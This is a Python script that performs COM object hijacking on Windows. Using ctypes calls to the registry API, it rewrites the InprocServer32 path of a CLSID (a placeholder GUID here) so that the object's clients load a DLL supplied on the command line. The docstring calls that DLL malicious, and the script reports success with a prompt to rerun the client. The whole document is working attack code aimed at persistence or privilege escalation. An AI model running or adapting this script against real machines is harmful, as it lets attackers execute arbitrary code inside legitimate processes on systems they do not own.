import ctypes
import os
import sys

# Constants for registry operations
HKEY_CLASSES_ROOT = 0x80000000
KEY_ALL_ACCESS = 0xF003F
REG_SZ = 1

# CLSID of the existing COM object
CLSID = "{DEADBEEF-FACE-FACE-FACE-DEADBEEFFACE}"

def set_registry_value(key, sub_key, value_name, value):
    """ Set the registry value """
    hkey = ctypes.c_void_p()
    result = ctypes.windll.advapi32.RegOpenKeyExW(
        key, sub_key, 0, KEY_ALL_ACCESS, ctypes.byref(hkey))
    if result != 0:
        raise Exception(f"Failed to open registry key: {result}")

    result = ctypes.windll.advapi32.RegSetValueExW(
        hkey, value_name, 0, REG_SZ, ctypes.c_wchar_p(value), len(value) * 2 + 2)
    if result != 0:
        raise Exception(f"Failed to set registry value: {result}")

    ctypes.windll.advapi32.RegCloseKey(hkey)

def hijack_com_object(dll_path):
    """ Hijack the COM object by changing its path to the malicious DLL """
    clsid_key = f"WOW6432Node\\CLSID\\{CLSID}\\InprocServer32"
    set_registry_value(HKEY_CLASSES_ROOT, clsid_key, None, dll_path)

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <path_to_dll>")
        sys.exit(1)

    dll_path = os.path.abspath(sys.argv[1])
    if not os.path.exists(dll_path):
        print(f"Error: DLL not found at {dll_path}")
        sys.exit(1)

    try:
        print("[*] Hijacking COM object...")
        hijack_com_object(dll_path)
        print("[*] COM object hijacked successfully. Try to run client again :)")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
